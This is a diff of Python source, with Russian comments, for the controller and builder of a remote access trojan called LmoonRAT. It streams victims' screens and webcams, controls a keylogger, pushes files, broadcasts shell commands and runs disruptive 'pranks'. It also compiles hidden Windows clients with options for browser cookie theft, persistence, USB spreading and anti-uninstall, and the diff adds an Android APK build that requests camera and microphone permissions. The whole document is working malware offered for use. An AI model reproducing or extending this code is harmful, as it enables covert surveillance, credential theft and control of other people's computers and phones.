             self.status.config(text=f"Клиентов: {len(self.clients)} | ВМ: {sum(1 for c in self.clients.values() if c['is_vm'])} | Безопасные: {sum(1 for c in self.clients.values() if c['safe_mode'])}")
     
     def refresh_clients(self):
-        # Проверяем активность клиентов
         for ip, client in list(self.clients.items()):
             try:
                 client["conn"].send(b"ping")
@@ -1767,58 +1876,27 @@ class RatController:
             except:
                 self.log(f"[!] Ошибка отправки команды {client['ip']}", "error")
     
-    def screenshot_selected(self):
-        client = self.get_selected_client()
-        if client:
-            try:
-                client["conn"].send(b"screenshot")
-                self.log(f"[*] Запрос скриншота от {client['ip']}", "info")
-            except:
-                self.log(f"[!] Ошибка запроса скриншота {client['ip']}", "error")
-    
-    def capture_camera_selected(self):
-        client = self.get_selected_client()
-        if client:
-            try:
-                client["conn"].send(b"camera")
-                self.log(f"[*] Запрос фото с камеры от {client['ip']}", "info")
-            except:
-                self.log(f"[!] Ошибка запроса фото с камеры {client['ip']}", "error")
-    
-    def record_audio_selected(self):
-        client = self.get_selected_client()
-        if client:
-            try:
-                client["conn"].send(b"microphone")
-                self.log(f"[*] Запись микрофона от {client['ip']}", "info")
-            except:
-                self.log(f"[!] Ошибка записи микрофона {client['ip']}", "error")
-    
     def stream_monitor_selected(self):
         client = self.get_selected_client()
         if client:
             try:
                 client["conn"].send(b"monitor")
-                self.log(f"[*] Трансляция экрана от {client['ip']}", "info")
+                self.log(f"[*] Запуск демонстрации экрана {client['ip']}", "info")
                 
-                # Открываем окно для просмотра экрана
                 threading.Thread(target=self.show_monitor_stream, args=(client,)).start()
             except:
-                self.log(f"[!] Ошибка запуска трансляции экрана {client['ip']}", "error")
+                self.log(f"[!] Ошибка запуска демонстрации экрана {client['ip']}", "error")
     
     def show_monitor_stream(self, client):
-        """Показ трансляции экрана в отдельном окне"""
         self.stream_active = True
         monitor_window = tk.Toplevel(self.root)
-        monitor_window.title(f"Монитор: {client['ip']}")
+        monitor_window.title(f"Демонстрация экрана: {client['ip']}")
         monitor_window.geometry("800x600")
         
-        # Виджет для отображения изображения
         img_label = tk.Label(monitor_window)
         img_label.pack(fill=tk.BOTH, expand=True)
         
-        # Кнопка остановки
-        stop_btn = tk.Button(monitor_window, text="Остановить трансляцию", 
+        stop_btn = tk.Button(monitor_window, text="Остановить", 
                             command=lambda: self.stop_monitor_stream(client, monitor_window),
                             bg="#8B0000", fg="white")
         stop_btn.pack(pady=10)
@@ -1826,22 +1904,18 @@ class RatController:
         def update_image():
             try:
                 while self.stream_active:
-                    # Получаем данные изображения
                     data = client["conn"].recv(4096)
                     if not data:
                         break
                     
                     try:
-                        # Конвертируем в изображение
                         img = Image.open(io.BytesIO(data))
                         img = img.resize((800, 600), Image.LANCZOS)
                         photo = ImageTk.PhotoImage(img)
                         
-                        # Обновляем виджет
                         img_label.configure(image=photo)
                         img_label.image = photo
                         
-                        # Небольшая задержка
                         monitor_window.update()
                         time.sleep(0.05)
                     except:
@@ -1851,17 +1925,74 @@ class RatController:
             finally:
                 monitor_window.destroy()
         
-        # Запускаем поток обновления изображения
         threading.Thread(target=update_image, daemon=True).start()
         
-        # Обработчик закрытия окна
         monitor_window.protocol("WM_DELETE_WINDOW", lambda: self.stop_monitor_stream(client, monitor_window))
     
     def stop_monitor_stream(self, client, window):
-        """Остановка трансляции экрана"""
         self.stream_active = False
         try:
             client["conn"].send(b"stop_monitor")
+        except:
+            pass
+        window.destroy()
+    
+    def capture_camera_selected(self):
+        client = self.get_selected_client()
+        if client:
+            try:
+                client["conn"].send(b"camera")
+                self.log(f"[*] Запуск демонстрации камеры {client['ip']}", "info")
+                
+                threading.Thread(target=self.show_camera_stream, args=(client,)).start()
+            except:
+                self.log(f"[!] Ошибка запуска демонстрации камеры {client['ip']}", "error")
+    
+    def show_camera_stream(self, client):
+        self.camera_active = True
+        camera_window = tk.Toplevel(self.root)
+        camera_window.title(f"Камера: {client['ip']}")
+        camera_window.geometry("640x480")
+        
+        img_label = tk.Label(camera_window)
+        img_label.pack(fill=tk.BOTH, expand=True)
+        
+        stop_btn = tk.Button(camera_window, text="Остановить", 
+                            command=lambda: self.stop_camera_stream(client, camera_window),
+                            bg="#8B0000", fg="white")
+        stop_btn.pack(pady=10)
+        
+        def update_image():
+            try:
+                while self.camera_active:
+                    data = client["conn"].recv(4096)
+                    if not data:
+                        break
+                    
+                    try:
+                        img = Image.open(io.BytesIO(data))
+                        photo = ImageTk.PhotoImage(img)
+                        
+                        img_label.configure(image=photo)
+                        img_label.image = photo
+                        
+                        camera_window.update()
+                        time.sleep(0.05)
+                    except:
+                        pass
+            except Exception as e:
+                self.log(f"[!] Ошибка трансляции камеры: {str(e)}", "error")
+            finally:
+                camera_window.destroy()
+        
+        threading.Thread(target=update_image, daemon=True).start()
+        
+        camera_window.protocol("WM_DELETE_WINDOW", lambda: self.stop_camera_stream(client, camera_window))
+    
+    def stop_camera_stream(self, client, window):
+        self.camera_active = False
+        try:
+            client["conn"].send(b"stop_camera")
         except:
             pass
         window.destroy()
@@ -1911,12 +2042,10 @@ class RatController:
                 self.log(f"[!] Ошибка отправки команды самоудаления {ip}", "error")
     
     def keylogger_control(self):
-        """Управление кейлоггером"""
         client = self.get_selected_client()
         if not client:
             return
             
-        # Создаем окно управления
         k_window = tk.Toplevel(self.root)
         k_window.title(f"Управление кейлоггером: {client['ip']}")
         k_window.geometry("300x200")
@@ -1938,7 +2067,6 @@ class RatController:
                  bg="#444444", fg="white").pack(pady=10)
 
     def send_keylog_cmd(self, client, cmd):
-        """Отправка команды кейлоггеру"""
         try:
             client["conn"].send(f"keylog {cmd}".encode())
             self.log(f"[*] Команда кейлоггеру: {cmd} на {client['ip']}", "info")
@@ -1946,7 +2074,6 @@ class RatController:
             self.log(f"[!] Ошибка отправки команды кейлоггеру {client['ip']}", "error")
     
     def upload_file(self):
-        """Загрузка файла на клиент"""
         client = self.get_selected_client()
         if not client:
             return
@@ -1959,11 +2086,9 @@ class RatController:
             with open(filepath, 'rb') as f:
                 file_data = f.read()
                 
-            # Кодируем в base64 для безопасной передачи
             b64_data = base64.b64encode(file_data).decode()
             filename = os.path.basename(filepath)
             
-            # Отправляем команду
             client["conn"].send(f"upload {filename} {b64_data}".encode())
             self.log(f"[*] Отправка файла {filename} на {client['ip']}", "info")
         except Exception as e:
@@ -1972,7 +2097,6 @@ class RatController:
     # ========== ФУНКЦИИ МЕНЮ ==========
     def stop_server(self):
         self.server_running = False
-        # Принудительно закрываем сокет для выхода из accept()
         try:
             temp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             temp_socket.connect(('127.0.0.1', 7777))
@@ -1988,7 +2112,6 @@ class RatController:
         if file: self.icon_path.set(file)
     
     def test_webhook(self):
-        """Тестирование Discord Webhook"""
         webhook_url = self.discord_webhook.get()
         if not webhook_url:
             messagebox.showwarning("Ошибка", "URL вебхука не указан!")
@@ -2008,7 +2131,6 @@ class RatController:
         subprocess.Popen(f'explorer "{BUILD_DIR}"')
     
     def install_builder_dependencies(self):
-        """Автоматическая установка необходимых зависимостей для билдера"""
         dependencies = [
             'psutil', 
             'browser_cookie3', 
@@ -2019,7 +2141,11 @@ class RatController:
             'opencv-python-headless',
             'pyaudio',
             'numpy',
-            'pycryptodome'
+            'pycryptodome',
+            'py7zr',
+            'pyautogui',
+            'kivy',
+            'buildozer'
         ]
         
         self.log("[*] Проверка зависимостей для билдера...", "info")
@@ -2030,12 +2156,11 @@ class RatController:
                 if spec is None:
                     self.log(f"[>] Установка {package}...", "info")
                     
-                    # Особые флаги для проблемных пакетов
                     install_cmd = [sys.executable, "-m", "pip", "install"]
                     if package == "psutil":
-                        install_cmd.append("--only-binary=:all:")  # Использовать бинарные пакеты
+                        install_cmd.append("--only-binary=:all:")
                     elif package == "opencv-python-headless":
-                        install_cmd.append("opencv-python-headless")  # Легкая версия без GUI
+                        install_cmd.append("opencv-python-headless")
                     
                     install_cmd.append(package)
                     
@@ -2049,19 +2174,96 @@ class RatController:
                     self.log("[!] Рекомендация: Установите Microsoft Visual C++ Build Tools", "warning")
                     self.log("[!] Ссылка: https://visualstudio.microsoft.com/visual-cpp-build-tools/", "warning")
     
+    def build_android_apk(self, py_path):
+        """Сборка APK для Android"""
+        try:
+            self.log("[*] Начало сборки APK для Android...", "info")
+            
+            # Создаем временный каталог для Android проекта
+            android_dir = os.path.join(BUILD_DIR, "android_build")
+            if not os.path.exists(android_dir):
+                os.makedirs(android_dir)
+            
+            # Копируем Python-скрипт
+            shutil.copy(py_path, os.path.join(android_dir, "main.py"))
+            
+            # Создаем файл buildozer.spec
+            spec_content = """
+[app]
+title = LmoonRAT
+package.name = lmoonrat
+package.domain = org.lmoon
+source.dir = .
+source.include_exts = py,png,jpg,kv,atlas
+version = 1.0
+requirements = python3,hostpython3,openssl,requests,pyjnius,kivy
+orientation = portrait
+osx.python_version = 3
+osx.kivy_version = 2.1.0
+fullscreen = 0
+android.permissions = INTERNET,ACCESS_NETWORK_STATE,ACCESS_WIFI_STATE,READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE,CAMERA,RECORD_AUDIO
+android.api = 30
+android.minapi = 21
+android.ndk = 21e
+android.sdk = 33
+android.ndk_path = 
+android.sdk_path = 
+p4a.branch = master
+android.arch = armeabi-v7a
+            """
+            
+            with open(os.path.join(android_dir, "buildozer.spec"), "w") as f:
+                f.write(spec_content)
+            
+            # Запускаем сборку
+            build_cmd = f"buildozer android debug"
+            process = subprocess.Popen(
+                build_cmd, 
+                shell=True, 
+                cwd=android_dir,
+                stdout=subprocess.PIPE, 
+                stderr=subprocess.PIPE,
+                text=True,
+                encoding='utf-8',
+                errors='replace'
+            )
+            
+            # Выводим прогресс в лог
+            while True:
+                output = process.stdout.readline()
+                if output == '' and process.poll() is not None:
+                    break
+                if output:
+                    self.log(output.strip(), "info")
+            
+            # Проверяем результат
+            if process.returncode == 0:
+                apk_path = os.path.join(android_dir, "bin", "lmoonrat-1.0-debug.apk")
+                if os.path.exists(apk_path):
+                    final_path = os.path.join(BUILD_DIR, "lmoonrat.apk")
+                    shutil.copy(apk_path, final_path)
+                    self.log(f"[+] APK успешно собран: {final_path}", "success")
+                    self.open_build_dir()
+                else:
+                    self.log("[!] Ошибка: APK не найден после сборки", "error")
+            else:
+                self.log("[!] Ошибка сборки APK!", "error")
+                
+        except Exception as e:
+            self.log(f"[!] Ошибка сборки APK: {str(e)}", "error")
+            exc_type, exc_value, exc_traceback = sys.exc_info()
+            self.log(''.join(traceback.format_exception(exc_type, exc_value, exc_traceback)), "error")
+    
     def build_client(self):
-        # Установка зависимостей для билдера
         self.install_builder_dependencies()
         
-        # Если включен тестовый режим - используем localhost
         if self.test_mode.get():
             self.ip_entry.delete(0, tk.END)
             self.ip_entry.insert(0, "127.0.0.1")
-            self.safe_mode.set(True)  # Форсируем безопасный режим
-            self.persistent_mode.set(False)  # Отключаем автозагрузку
+            self.safe_mode.set(True)
+            self.persistent_mode.set(False)
             self.log("[*] Активирован тестовый режим (localhost)", "info")
         
-        # Получение параметров
         host = self.ip_entry.get()
         port = int(self.port_entry.get())
         filename = self.filename_entry.get()
@@ -2069,65 +2271,12 @@ class RatController:
         file_extension = self.extension_entry.get()
         discord_webhook = self.discord_webhook.get()
         
-        # Генерация ключа шифрования
         encrypt_key = os.urandom(16)
         encrypt_key_hex = base64.b64encode(encrypt_key).decode()
         
-        # Определение хоста
         self.log(f"[*] Используется IP: {host}", "info")
         
-        # Генерация кода клиента
-        client_code = self.generate_client_code(host, port, file_extension, discord_webhook, encrypt_key_hex)
-        
-        # Сохранение кода
-        py_path = os.path.join(BUILD_DIR, "client_temp.py")
-        with open(py_path, "w", encoding="utf-8") as f:
-            f.write(client_code)
-            
-        # Команда сборки
-        build_cmd = f'pyinstaller --noconsole --onefile --log-level=ERROR --noconfirm --clean'
-        if icon_path:
-            build_cmd += f' --icon="{icon_path}"'
-        build_cmd += f' --distpath="{BUILD_DIR}"'
-        build_cmd += f' --name="{filename}"'
-        
-        # Добавляем скрытые импорты
-        build_cmd += ' --hidden-import mss --hidden-import pynput'
-        build_cmd += ' --hidden-import cv2 --hidden-import pyaudio'
-        build_cmd += ' --hidden-import Crypto.Cipher --hidden-import Crypto.Util.Padding'
-        
-        # Динамическое добавление browser_cookie3
-        if self.steal_cookies.get():
-            try:
-                # Получаем путь к модулю browser_cookie3
-                import browser_cookie3
-                module_path = browser_cookie3.__path__[0]
-                
-                # Нормализация пути для Windows
-                module_path = os.path.normpath(module_path)
-                
-                self.log(f"[+] Путь к browser_cookie3: {module_path}", "info")
-                
-                # Проверка существования пути
-                if os.path.exists(module_path):
-                    build_cmd += f' --add-data="{module_path}{os.pathsep}browser_cookie3"'
-                else:
-                    self.log("[!] Путь к browser_cookie3 не существует", "warning")
-            except ImportError as e:
-                self.log(f"[!] Ошибка импорта browser_cookie3: {str(e)}", "error")
-                if self.steal_cookies.get():
-                    self.log("[!] Предупреждение: Функция Steal Cookies недоступна", "warning")
-        
-        build_cmd += f' "{py_path}"'
-        
-        # Запуск сборки в отдельном потоке
-        threading.Thread(target=self.run_build, args=(build_cmd, py_path, filename)).start()
-        self.log("[*] Начало сборки клиента...", "info")
-        self.log(f"[>] Команда: {build_cmd}", "info")
-    
-    def generate_client_code(self, host, port, file_extension, discord_webhook, encrypt_key):
-        # Подставляем настройки в шаблон
-        return CLIENT_TEMPLATE.replace("{SAFE_MODE}", "True" if self.safe_mode.get() else "False") \
+        client_code = CLIENT_TEMPLATE.replace("{SAFE_MODE}", "True" if self.safe_mode.get() else "False") \
             .replace("{DEBUG_MODE}", "True" if self.debug_mode.get() else "False") \
             .replace("{PERSISTENT}", "True" if self.persistent_mode.get() else "False") \
             .replace("{HIDE_FILE}", "True" if self.hide_file.get() else "False") \
@@ -2138,19 +2287,61 @@ class RatController:
             .replace("{USB_SPREAD}", "True" if self.usb_spread.get() else "False") \
             .replace("{ANTI_UNINSTALL}", "True" if self.anti_uninstall.get() else "False") \
             .replace("{CAMERA_CAPTURE}", "True" if self.camera_capture.get() else "False") \
-            .replace("{MICROPHONE_RECORD}", "True" if self.microphone_record.get() else "False") \
             .replace("{ENCRYPT_COMMS}", "True" if self.encrypt_comms.get() else "False") \
             .replace("{KEYLOGGER}", "True" if self.keylogger.get() else "False") \
             .replace("{FILE_TRANSFER}", "True" if self.file_transfer.get() else "False") \
+            .replace("{ENABLE_PRANKS}", "True" if self.enable_pranks.get() else "False") \
             .replace("{DISCORD_WEBHOOK}", discord_webhook) \
-            .replace("{ENCRYPT_KEY}", encrypt_key) \
+            .replace("{ENCRYPT_KEY}", encrypt_key_hex) \
             .replace("{FILE_EXTENSION}", file_extension) \
             .replace("{HOST}", host) \
             .replace("{PORT}", str(port))
+        
+        py_path = os.path.join(BUILD_DIR, "client_temp.py")
+        with open(py_path, "w", encoding="utf-8") as f:
+            f.write(client_code)
+            
+        if self.build_apk.get():
+            # Сборка APK для Android
+            threading.Thread(target=self.build_android_apk, args=(py_path,)).start()
+            return
+            
+        build_cmd = f'pyinstaller --noconsole --onefile --log-level=ERROR --noconfirm --clean'
+        if icon_path:
+            build_cmd += f' --icon="{icon_path}"'
+        build_cmd += f' --distpath="{BUILD_DIR}"'
+        build_cmd += f' --name="{filename}"'
+        
+        # Добавляем ВСЕ необходимые скрытые импорты
+        hidden_imports = [
+            'mss', 'pynput', 'cv2', 'pyaudio', 
+            'Crypto.Cipher', 'Crypto.Util.Padding', 'pyautogui',
+            'browser_cookie3', 'sqlite3', 'winreg', 'psutil',
+            'PIL', 'PIL.Image', 'numpy', 'keyboard', 'py7zr',
+            'ctypes', 'socket', 'threading', 'subprocess'
+        ]
+        for imp in hidden_imports:
+            build_cmd += f' --hidden-import={imp}'
+        
+        # Особый обработчик для browser_cookie3
+        if self.steal_cookies.get():
+            try:
+                import browser_cookie3
+                module_path = os.path.dirname(browser_cookie3.__file__)
+                if os.path.exists(module_path):
+                    # Корректное добавление данных с экранированием
+                    build_cmd += f' --add-data="{module_path}{os.pathsep}browser_cookie3"'
+            except Exception as e:
+                self.log(f"[!] Ошибка обработки browser_cookie3: {str(e)}", "error")
+        
+        build_cmd += f' "{py_path}"'
+        
+        threading.Thread(target=self.run_build, args=(build_cmd, py_path, filename)).start()
+        self.log("[*] Начало сборки клиента...", "info")
+        self.log(f"[>] Команда: {build_cmd}", "info")
     
     def run_build(self, cmd, py_path, filename):
         try:
-            # Запуск PyInstaller
             process = subprocess.Popen(
                 cmd, 
                 shell=True, 
@@ -2166,14 +2357,12 @@ class RatController:
                 self.log("[+] Сборка успешна!", "success")
                 self.log(f"[+] Клиент сохранен: {BUILD_DIR}\\{filename}.exe", "success")
                 
-                # Автозапуск клиента после сборки
                 if self.auto_start.get():
                     exe_path = os.path.join(BUILD_DIR, f"{filename}.exe")
                     if os.path.exists(exe_path):
                         subprocess.Popen([exe_path], creationflags=subprocess.CREATE_NO_WINDOW)
                         self.log("[+] Клиент автоматически запущен", "success")
                 
-                # Удаление временных файлов
                 if self.auto_clean.get():
                     temp_files = [
                         os.path.join(BUILD_DIR, "client_temp"),
@@ -2192,11 +2381,9 @@ class RatController:
                                 except:
                                     pass
                 
-                # Информация о безопасном режиме
                 if self.safe_mode.get():
                     self.log("[!] ВНИМАНИЕ: Клиент собран в безопасном режиме", "warning")
                 
-                # Автоматическое открытие папки сборки
                 self.open_build_dir()
             else:
                 self.log("[!] Ошибка сборки!", "error")
@@ -2214,7 +2401,6 @@ class RatController:
         self.cmd_output.insert(tk.END, f">>> {cmd}\n")
         self.cmd_entry.delete(0, tk.END)
         
-        # Отправка команды всем клиентам
         for ip, client in self.clients.items():
             try:
                 client["conn"].send(f"cmd {cmd}".encode())
@@ -2223,6 +2409,45 @@ class RatController:
                 self.cmd_output.insert(tk.END, f"[{ip}] Ошибка отправки\n")
         
         self.cmd_output.see(tk.END)
+    
+    # ========== ФУНКЦИИ ПРИКОЛОВ ==========
+    def execute_prank(self, prank_type):
+        client = self.get_selected_client()
+        if not client:
+            return
+            
+        try:
+            client["conn"].send(f"prank {prank_type}".encode())
+            self.log(f"[*] Выполнение прикола '{prank_type}' на {client['ip']}", "info")
+        except:
+            self.log(f"[!] Ошибка выполнения прикола {client['ip']}", "error")
+
+    def show_prank_menu(self):
+        prank_window = tk.Toplevel(self.root)
+        prank_window.title("Выберите прикол")
+        prank_window.geometry("400x300")
+        
+        pranks = [
+            ("Инвертировать экран", "invert_screen"),
+            ("Перевернуть экран", "rotate_screen"),
+            ("Фейковый синий экран", "fake_bsod"),
+            ("Отключить клавиатуру", "disable_keyboard"),
+            ("Дергать мышкой", "mouse_jiggler"),
+            ("Надоедливые popup", "annoying_popup"),
+            ("Проиграть звук", "play_sound")
+        ]
+        
+        for text, cmd in pranks:
+            btn = tk.Button(
+                prank_window, 
+                text=text, 
+                command=lambda c=cmd: self.execute_prank(c),
+                bg="#8B0000", 
+                fg="white",
+                width=30,
+                height=2
+            )
+            btn.pack(pady=5)
 
 # ========== ЗАПУСК ПРИЛОЖЕНИЯ ==========
 if __name__ == "__main__":
